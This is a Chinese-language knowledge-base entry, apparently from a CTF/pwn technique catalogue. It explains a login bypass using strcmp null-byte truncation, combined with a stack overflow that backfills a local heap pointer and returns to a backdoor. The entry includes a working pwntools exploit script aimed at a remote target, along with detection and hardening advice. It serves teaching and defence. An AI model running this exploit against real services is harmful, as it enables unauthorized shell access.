---
id: binary-pwn-stack-strcmp-nullbyte-local-ptr-backfill-ret2text
title: strcmp 空字节截断绕过登录 + 覆盖局部指针回填堆地址的 ret2backdoor
type: scenario
domain: binary
path: binary/pwn/stack
technique: strcmp-nullbyte-bypass-local-ptr-backfill-ret2text
aliases:
- strcmp 截断
- 空字节绕过登录
- 局部指针回填
- free 不崩
- ret2backdoor
tags:
- pwn
- stack
- strcmp
- null-byte
- ret2text
- heap-leak
- free
- alignment
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V95
  verified_at: '2026-11-05T20:03:41+08:00'
  notes: 已对照原文 pwner_LEVEL3 与 14 张图核对：read 不补 \0 + strcmp 前缀绕过、vuln 中 buf[0x40]/malloc(0x100)/printf chunk_addr/memcpy 0x100/free(p)、局部指针 0x48、saved RBP 0x50、ret 0x40129f、backdoor 0x4011a6 与 exp 完全一致；gift() pop rdi;ret 与 free 的 misaligned_chunk 检查说明正确。未验证点：未复跑 exp（地址依赖题目二进制）；无版本。
---

## 一句话结论

当程序用 `read` 读入口令但不补 `\0`、随后用 `strcmp` 与固定字符串比较时，发送 `admin\0...`/`123456\0...` 即可通过登录；进入漏洞函数后，栈溢出会覆盖保存的局部堆指针，把程序泄漏的 chunk 地址回填到该槽位可让 `free(p)` 继续释放合法块，再用一个 `ret` gadget 对齐 16 字节栈后跳到 backdoor 即可 getshell。

## 原理

- `strcmp` 在遇到第一个 `\0` 时停止比较；`read` 只按长度读字节、不会自动追加终止符。因此缓冲区内容为 `"admin\0AAAA..."` 时，`strcmp(buf,"admin")==0` 成立，后面的垃圾字节不参与比较；口令同理。
- 漏洞函数通常形如：`char buf[0x40]; void *p=malloc(0x100); printf("chunk_addr: %p", p); read(0,p,0x1000); memcpy(buf,p,0x100); free(p);`。`memcpy` 把 0x100 字节复制进 0x40 的栈缓冲区，造成栈溢出。
- 该函数的局部布局（示例）为：`buf[0x40]` → 8 字节填充 → 局部指针 `p`（偏移 0x48）→ saved RBP（0x50）→ saved RIP（0x58）。溢出数据会同时覆盖局部指针 `p`；如果不修复，`free(p)` 收到攻击者填入的垃圾指针，会在 `free` 的 chunk 校验处崩溃。把 `p` 回填为程序刚刚泄漏的真实 chunk 地址，`free` 就能正常释放。
- 之后 saved RBP 填任意值、saved RIP 填 `ret` gadget、下一格填 backdoor。插入额外 `ret` 的原因是 x86-64 ABI 要求调用函数时 RSP 16 字节对齐，backdoor 内的 `system`/`movaps` 对未对齐栈会崩溃；`ret` 多弹一次正好补回 8 字节。
- 之所以能成立：登录逻辑只校验内容前缀，堆地址被程序主动打印，且溢出范围覆盖了返回地址与局部指针两个区域。

## 触发条件

- 登录校验使用 `read` + `strcmp`，`read` 读取长度大于字符串实际长度且不手动补 `\0`。
- 漏洞函数存在栈缓冲区到堆的 `memcpy` 溢出，且局部堆指针在溢出覆盖范围内。
- 程序打印/泄漏了 `malloc` 返回的 chunk 地址（或可通过其他方式获得合法 chunk 地址）。
- 二进制未开启 PIE（或已泄漏代码基址），能确定 `ret` gadget 与 backdoor 地址；未开启 Canary 或可绕过。
- backdoor 会调用 `system("/bin/sh")` 或等价函数。

## 利用步骤

1. 逆向确认登录逻辑与漏洞函数布局；用 `checksec` 查看 PIE/Canary。
2. 第一轮：用户名发送 `b"admin\x00" + b"A"*(0x40-6)`，口令发送 `b"123456\x00" + b"B"*(0x100-7)`，使两个 `strcmp` 都因 `\0` 提前结束而返回相等。
3. 进入漏洞函数后读取 `chunk_addr` 泄漏值。
4. 计算偏移（示例 0x48 到局部指针槽），构造：`b"A"*0x48 + p64(chunk_addr) + p64(0) + p64(ret) + p64(backdoor)`。
5. 发送 payload；`memcpy` 溢出改写局部指针与返回地址，`free(p)` 正常释放，函数返回时经 `ret` 对齐跳到 backdoor，执行 `system("/bin/sh")`。

## PoC

```python
from pwn import *

io = remote("目标ip", 端口)

# 1) 绕过登录：read 不补 \0，strcmp 在 \0 处停止
io.recvuntil(b"input your name:\n")
io.send(b"admin\x00" + b"A" * (0x40 - 6))
io.recvuntil(b"input your pasword:\n")
io.send(b"123456\x00" + b"B" * (0x100 - 7))

# 2) 读取泄漏的 chunk 地址
io.recvuntil(b"chunk_addr: ")
heap_addr = int(io.recvline().strip(), 16)

# 3) 回填局部指针，ret 对齐后跳 backdoor（地址按目标二进制替换）
ret = 0x40129f
backdoor = 0x4011a6
payload = b"a" * 0x48 + p64(heap_addr) + p64(0) + p64(ret) + p64(backdoor)
io.send(payload)
io.interactive()
```

## 变体与关联

- 变体：局部指针槽位偏移随编译器/优化级别变化，需用 `pattern` 或反汇编确认；若指针在寄存器中而未被覆盖，则无需回填。
- 变体：没有堆地址泄漏时，可改为让溢出数据构造合法 chunk 头，或避开 `free` 路径（如先跳转、不返回）。
- 变体：登录处若用 `strncmp` 但长度可控，可同样利用前缀匹配；若用 `memcmp` 则空字节截断无效。
- 关联：[[binary-pwn-stack-ret2libc]]（栈对齐与返回地址劫持的通用路线）、[[binary-pwn-format-string-canary-leak-ret2copy-authorized-keys]]（另一类登录前泄露 + 返回地址控制的组合）。

## 检测与防御

- 检测：代码审计搜索 `read` 后直接 `strcmp` 的认证逻辑；关注“先 malloc 打印地址、再 memcpy 到小栈缓冲区、再 free”的函数；崩溃转储中出现堆地址被写入栈帧/保存 RBP 槽位。
- 修复：读取后强制 `buf[len]='\0'` 并校验长度；口令比较使用 `memcmp`/定长哈希；把 `memcpy` 长度限制为目标缓冲区大小。
- 加固：开启 Canary、PIE、Full RELRO；不要向用户泄漏堆地址；移除不必要的 backdoor/`system` 调用；对以高权限运行的程序做输入边界校验。
